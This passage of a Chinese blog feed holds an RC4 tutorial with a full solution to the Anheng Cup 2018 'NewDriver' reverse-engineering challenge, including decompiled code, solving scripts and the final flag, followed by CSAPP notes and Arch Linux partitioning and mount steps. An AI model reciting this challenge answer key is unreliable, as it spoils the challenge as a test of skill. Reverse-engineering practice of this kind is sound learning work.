class="line">    &#123;</span><br><span class="line">        s2[i] = s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经初始化，现在加密:\n\n&quot;</span>);</span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//加密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经加密，现在解密:\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s2, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>安恒杯2018-9的NewDriver</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">255</span>]; <span class="comment">// [esp+Dh] [ebp-237h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">256</span>]; <span class="comment">// [esp+10Ch] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">52</span>]; <span class="comment">// [esp+20Ch] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="keyword">sizeof</span>(v7));</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;flag&#123;this_is_not_the_flag_hahaha&#125;&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v8[<span class="number">34</span>], <span class="number">0</span>, <span class="number">0xDE</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input flag:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, v9);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v9) == <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)sub_401160(); <span class="comment">//base64加密 改表,直接给出换的表没什么好说的</span></span><br><span class="line">    sub_401000(v8, <span class="built_in">strlen</span>(v8));  <span class="comment">//rc4的初试化</span></span><br><span class="line">    sub_4010E0(v3, <span class="built_in">strlen</span>(v3));  <span class="comment">//rc4的加密</span></span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v5 = v3 - byte_402104;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_402104[v5 + v4] != byte_402104[v4] )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 &lt; <span class="number">44</span> );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulation!!!!!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下4010E0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall sub_4010E0@&lt;eax&gt;(<span class="keyword">int</span> result@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v6; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a3; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (v3 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v6 = *(_BYTE *)(v3 + result);</span><br><span class="line">    v4 = (v6 + v4) % <span class="number">256</span>;</span><br><span class="line">    *(_BYTE *)(v3 + result) = *(_BYTE *)(v4 + result);</span><br><span class="line">    *(_BYTE *)(v4 + result) = v6;</span><br><span class="line">    *(_BYTE *)(i + a2) ^= *(_BYTE *)((v6 + *(<span class="keyword">unsigned</span> __int8 *)(v3 + result)) % <span class="number">256</span> + result);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再查看汇编,很明显了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">;截取部分</span><br><span class="line">.text:004010F1                   loc_4010F1:                   ; CODE XREF: sub_4010E0+6B↓j</span><br><span class="line">.text:004010F1 41                inc     ecx</span><br><span class="line">.text:004010F2 81 E1 FF 00 00 80 and     ecx, 800000FFh</span><br><span class="line">.text:004010F8 79 08             jns     short loc_401102</span><br><span class="line">.text:004010FA 49                dec     ecx</span><br><span class="line">.text:004010FB 81 C9 00 FF FF FF or      ecx, 0FFFFFF00h</span><br><span class="line">.text:00401101 41                inc     ecx</span><br><span class="line">.text:00401102</span><br><span class="line">.text:00401102                   loc_401102:                   ; CODE XREF: sub_4010E0+18↑j</span><br><span class="line">.text:00401102 8A 14 01          mov     dl, [ecx+eax]</span><br><span class="line">.text:00401105 0F B6 DA          movzx   ebx, dl</span><br><span class="line">.text:00401108 03 F3             add     esi, ebx</span><br><span class="line">.text:0040110A 81 E6 FF 00 00 80 and     esi, 800000FFh</span><br><span class="line">.text:00401110 79 08             jns     short loc_40111A</span><br><span class="line">.text:00401112 4E                dec     esi</span><br><span class="line">.text:00401113 81 CE 00 FF FF FF or      esi, 0FFFFFF00h</span><br><span class="line">.text:00401119 46                inc     esi</span><br></pre></td></tr></table></figure><p>key是v8提取的数据,利用上面的函数写一个脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">91</span>, <span class="number">92</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">125</span>, <span class="number">126</span>, <span class="number">127</span>, <span class="number">128</span>, <span class="number">129</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">132</span>, <span class="number">133</span>, <span class="number">134</span>, <span class="number">135</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">138</span>, <span class="number">139</span>, <span class="number">140</span>, <span class="number">141</span>, <span class="number">142</span>, <span class="number">143</span>, <span class="number">144</span>, <span class="number">145</span>, <span class="number">146</span>, <span class="number">147</span>, <span class="number">148</span>, <span class="number">149</span>, <span class="number">150</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">153</span>, <span class="number">154</span>, <span class="number">155</span>, <span class="number">156</span>, <span class="number">157</span>, <span class="number">158</span>, <span class="number">159</span>, <span class="number">160</span>, <span class="number">161</span>, <span class="number">162</span>, <span class="number">163</span>, <span class="number">164</span>, <span class="number">165</span>, <span class="number">166</span>, <span class="number">167</span>, <span class="number">168</span>, <span class="number">169</span>, <span class="number">170</span>, <span class="number">171</span>, <span class="number">172</span>, <span class="number">173</span>, <span class="number">174</span>, <span class="number">175</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">178</span>, <span class="number">179</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">182</span>, <span class="number">183</span>, <span class="number">184</span>, <span class="number">185</span>, <span class="number">186</span>, <span class="number">187</span>, <span class="number">188</span>, <span class="number">189</span>, <span class="number">190</span>, <span class="number">191</span>, <span class="number">192</span>, <span class="number">193</span>, <span class="number">194</span>, <span class="number">195</span>, <span class="number">196</span>, <span class="number">197</span>, <span class="number">198</span>, <span class="number">199</span>, <span class="number">200</span>, <span class="number">201</span>, <span class="number">202</span>, <span class="number">203</span>, <span class="number">204</span>, <span class="number">205</span>, <span class="number">206</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">209</span>, <span class="number">210</span>, <span class="number">211</span>, <span class="number">212</span>, <span class="number">213</span>, <span class="number">214</span>, <span class="number">215</span>, <span class="number">216</span>, <span class="number">217</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">220</span>, <span class="number">221</span>, <span class="number">222</span>, <span class="number">223</span>, <span class="number">224</span>, <span class="number">225</span>, <span class="number">226</span>, <span class="number">227</span>, <span class="number">228</span>, <span class="number">229</span>, <span class="number">230</span>, <span class="number">231</span>, <span class="number">232</span>, <span class="number">233</span>, <span class="number">234</span>, <span class="number">235</span>, <span class="number">236</span>, <span class="number">237</span>, <span class="number">238</span>, <span class="number">239</span>, <span class="number">240</span>, <span class="number">241</span>, <span class="number">242</span>, <span class="number">243</span>, <span class="number">244</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">247</span>, <span class="number">248</span>, <span class="number">249</span>, <span class="number">250</span>, <span class="number">251</span>, <span class="number">252</span>, <span class="number">253</span>, <span class="number">254</span>, <span class="number">255</span>&#125;;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">char</span> k[<span class="number">256</span>] = &#123;<span class="string">&quot;flag&#123;this_is_not_the_flag_hahaha&#125;&quot;</span>&#125;;</span><br><span class="line">   rc4_init(s, k, <span class="number">33</span>);</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, s[i]);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>key2是byte_402104的数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">key=[0x66, 0x32, 0xCA, 0xA0, 0xBF, 0x98, 0x2D, 0x76, 0xF1, 0x59, 0x2A, 0x4A, 0xF4, 0x30, 0xAD, 0xD2, 0x1D, 0x02, 0xD8, 0x23, 0x89, 0x5D, 0x83, 0x38, 0x09, 0xF2, 0x74, 0x65, 0x40, 0x19, 0xC6, 0xDD, 0x18, 0xD3, 0x8F, 0x6C, 0x8B, 0xC0, 0xC5, 0x54, 0x2E, 0x81, 0x10, 0xC4, 0x26, 0x56, 0x5F, 0x53, 0x80, 0x43, 0x27, 0x62, 0xEA, 0x3D, 0xE6, 0x00, 0xE7, 0xB7, 0x50, 0x94, 0x90, 0x4C, 0x3F, 0x9D, 0x07, 0xE0, 0xA3, 0x9C, 0x4E, 0x0F, 0x9F, 0xFE, 0x5B, 0x8E, 0xDE, 0x88, 0x72, 0x2F, 0xC1, 0x67, 0x31, 0x70, 0x8D, 0xFD, 0xBE, 0x64, 0xC3, 0xBD, 0x6B, 0x7A, 0xCF, 0x0C, 0x34, 0x1F, 0x6F, 0x01, 0xF0, 0x7C, 0x5E, 0xA4, 0x1E, 0x49, 0x8C, 0x75, 0x1C, 0xE3, 0x20, 0x48, 0x28, 0x79, 0xA5, 0x7F, 0xF5, 0xEC, 0x4F, 0x78, 0x58, 0x11, 0xF7, 0xCD, 0x91, 0x13, 0xFC, 0xB8, 0x2C, 0x04, 0xEE, 0xD5, 0x08, 0x44, 0xA9, 0xE1, 0xB1, 0x42, 0x84, 0x29, 0xA7, 0x47, 0x97, 0x7E, 0xE8, 0xB3, 0x60, 0x0B, 0xF9, 0x4B, 0x3C, 0x77, 0x17, 0x03, 0x82, 0x69, 0x87, 0xD4, 0x95, 0x1A, 0x33, 0x25, 0x6E, 0xCC, 0xD6, 0xBB, 0x99, 0xB0, 0x85, 0x41, 0xB2, 0x0D, 0xDB, 0x35, 0x3B, 0x5C, 0xF8, 0xED, 0x9E, 0xA6, 0x96, 0x39, 0x63, 0x0A, 0x1B, 0x93, 0x21, 0x46, 0x12, 0xD0, 0xB4, 0x22, 0x51, 0xC9, 0x61, 0xD1, 0x2B, 0xAA, 0x45, 0x06, 0x05, 0xCE, 0xFA, 0x92, 0x68, 0xAB, 0x36, 0xDA, 0xC8, 0xE2, 0x37, 0xD9, 0xA2, 0x5A, 0xD7, 0x6A, 0xB5, 0xFF, 0xE9, 0xBA, 0x52, 0x15, 0xF6, 0xBC, 0x9A, 0xB6, 0xEF, 0x6D, 0xCB, 0x4D, 0xAE, 0xE4, 0xA1, 0xAC, 0xEB, 0x0E, 0x71, 0x7B, 0xF3, 0x24, 0xC2, 0xFB, 0x7D, 0x86, 0x55, 0xAF, 0x3A, 0xDF, 0x3E, 0x14, 0xB9, 0x9B, 0x16, 0xDC, 0x73, 0x57, 0xE5, 0xC7, 0x8A, 0xA8, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x74, 0x68, 0x69, 0x73, 0x5F, 0x69, 0x73, 0x5F, 0x6E, 0x6F, 0x74, 0x5F, 0x74, 0x68, 0x65, 0x5F, 0x66, 0x6C, 0x61, 0x67, 0x5F, 0x68, 0x61, 0x68, 0x61, 0x68, 0x61, 0x7D]</span><br><span class="line">key2=[0x20, 0xC3, 0x1A, 0xAE, 0x97, 0x3C, 0x7A, 0x41, 0xDE, 0xF6, 0x78, 0x15, 0xCB, 0x4B, 0x4C, 0xDC, 0x26, 0x55, 0x8B, 0x55, 0xE5, 0xE9, 0x55, 0x75, 0x40, 0x3D, 0x82, 0x13, 0xA5, 0x60, 0x13, 0x3B, 0xF5, 0xD8, 0x19, 0x0E, 0x47, 0xCF, 0x5F, 0x5E, 0xDE, 0x9D, 0x14, 0xBD]</span><br><span class="line">key3=[]</span><br><span class="line">v3=0</span><br><span class="line">v4=0</span><br><span class="line">v6=0</span><br><span class="line">s=&quot;&quot;</span><br><span class="line">for v3 in range(44):</span><br><span class="line">  v3+=1</span><br><span class="line">  v6=key[v3]</span><br><span class="line">  v4=(v6+v4)%256</span><br><span class="line">  key[v3]=key[v4]</span><br><span class="line">  key[v4]=v6</span><br><span class="line">  key3.append(key[(key[v3]+v6)%256])</span><br><span class="line">for i in range(44):</span><br><span class="line">  key2[i]^=key3[i]</span><br><span class="line">for i in key2:</span><br><span class="line">  s+=chr(i)</span><br><span class="line">print s</span><br></pre></td></tr></table></figure><p>得到字符串</p><p>ZeptZ3l5UHQra25nd19yYzMrYR5wX2Jtc2P2VF9gYNM9</p><p>base64解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findchar</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;str[i];i++)</span><br><span class="line">  <span class="keyword">if</span>(str[i]==c)</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[]=<span class="string">&quot;ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> ans[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> temp[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">memset</span>(str,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line"><span class="built_in">memset</span>(ans,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;str[i];i+=<span class="number">4</span>,j+=<span class="number">3</span>)</span><br><span class="line">  &#123;temp[<span class="number">0</span>]=findchar(key,str[i]);</span><br><span class="line">   temp[<span class="number">1</span>]=findchar(key,str[i+<span class="number">1</span>]);</span><br><span class="line">   ans[j]=(temp[<span class="number">0</span>]&lt;&lt;<span class="number">2</span>&amp;<span class="number">0xfc</span>)|(temp[<span class="number">1</span>]&gt;&gt;<span class="number">4</span>&amp;<span class="number">0x3</span>);</span><br><span class="line">   <span class="keyword">if</span>(!str[i+<span class="number">2</span>]||str[i+<span class="number">2</span>]==<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">      temp[<span class="number">0</span>]=findchar(key,str[i+<span class="number">2</span>]);</span><br><span class="line">      ans[j+<span class="number">1</span>]=(temp[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>&amp;<span class="number">0xf0</span>)|(temp[<span class="number">0</span>]&gt;&gt;<span class="number">2</span>&amp;<span class="number">0xf</span>);  </span><br><span class="line">       &#125;</span><br><span class="line">   <span class="keyword">if</span>(!str[i+<span class="number">3</span>]||str[i+<span class="number">3</span>]==<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">       temp[<span class="number">1</span>]=findchar(key,str[i+<span class="number">3</span>]);</span><br><span class="line">       ans[j+<span class="number">2</span>]=(temp[<span class="number">0</span>]&lt;&lt;<span class="number">6</span>&amp;<span class="number">0xc0</span>)|(temp[<span class="number">1</span>]&amp;<span class="number">0x3f</span>);</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后flag{y0u_know_rc4_and_base64_ha$}</p><h2 id="魔改RC4"><a href="#魔改RC4" class="headerlink" title="魔改RC4"></a>魔改RC4</h2><p>RC4魔改还是比较难的，稍有改变，整个算法就完全不同了。因此，大多数赛题将rc4与其他算法进行组合来加密flag</p><p>常见变化位置</p><ol><li>密钥经过上一步的其他加密后传入</li><li>s盒内部数据固定</li><li>rc4加密后数据进行重加密</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><p><a href="https://zh.wikipedia.org/zh-hans/RC4">Wiki</a></p></li><li><p><a href="https://ctf-wiki.org/crypto/streamcipher/special/rc4/">CTF-Wiki</a></p></li><li><p><a href="https://www.52pojie.cn/thread-799618-1-1.html">吾爱破解_解题过程</a></p></li><li><p><a href="https://kabeor.cn/RC4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/">RC4博客</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序的机器级表示</title>
      <link href="/2021/10/23/ReadNotes/CSCPP/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/"/>
      <url>/2021/10/23/ReadNotes/CSCPP/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h1><p>GCCC 语言编译器以汇编代码的形式产生输出，汇编代码是机器代码的文本表示，给出程序中的每一条指令。然后GCC 调用汇编器和链接器，根据汇编代码生成可执行的机器代码。</p><p><code>我们为什么要学习汇编语言？</code></p><ul><li>阅读汇编有助于我们理解编译器的优化能力,分析代码中隐含的低效率</li><li>不同线程是如何保持数据私有或共享数据</li><li>程序被攻击的许多方式涉及程序存储运行时的控制信息的方式的细节,许多攻击利用了系统程序中的漏洞重写信息,获取系统的控制权</li></ul><p>我们需要了解编译器在将<code>c语言转化为机器代码</code>时转化,优化编译器能重新排列执行顺序,,消除不必要的计算,用快速操作替代慢速操作.这是一种<code>逆向工程(Reverse Engineering)</code></p><p>基于x86-64，关注GCC和Linux使用的特性</p><p>程序计数器：PC、x86-64用%rip表示，给出将要执行的下一条指令在内存中的指令</p>]]></content>
      
      
      
        <tags>
            
            <tag> ReadNotes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arch linux的搭建</title>
      <link href="/2021/09/29/Linux%E5%AD%A6%E4%B9%A0/archlinux%E6%90%AD%E5%BB%BA/"/>
      <url>/2021/09/29/Linux%E5%AD%A6%E4%B9%A0/archlinux%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="arch-linux的搭建"><a href="#arch-linux的搭建" class="headerlink" title="arch linux的搭建"></a>arch linux的搭建</h1><h2 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h2><p>cgdisk /dev/sda</p><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p>磁盘分区如下：sda1,2,3,4</p><ul><li>sda1  1G boot        EFI system</li><li>sda2  8G swap      </li><li>sda3  40G root /</li><li>sda4  51G home</li></ul><p>以下为格式化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkfs.fat -F 32 /dev/sda1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 报错了</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkfs.fat: unable to open /dev/sda1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 好像是因为占用了，不会解决重启吧  :D</span></span><br><span class="line">mkswap /dev/sda2</span><br><span class="line"></span><br><span class="line">mkfs.ext4 /dev/sda3</span><br><span class="line">mkfs.ext4 /dev/sda4</span><br></pre></td></tr></table></figure><p>挂载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">swapon /dev/sda2</span><br><span class="line">mount /dev/sda3 /mnt</span><br><span class="line">mount /dev/sda1 /mnt/boot # 报错因为没有这个区，输入 mkdir /mnt/boot</span><br><span class="line"><span class="meta">#</span><span class="bash"> 继续类似操作</span></span><br><span class="line">mkdir /mnt/home</span><br><span class="line">mount /dev/sda4 /mnt/home</span><br><span class="line"><span class="meta">#</span><span class="bash">完成挂载操作 lsblk查看挂载</span></span><br></pre></td></tr></table></figure><h2 id="pacman服务器"><a href="#pacman服务器" class="headerlink" 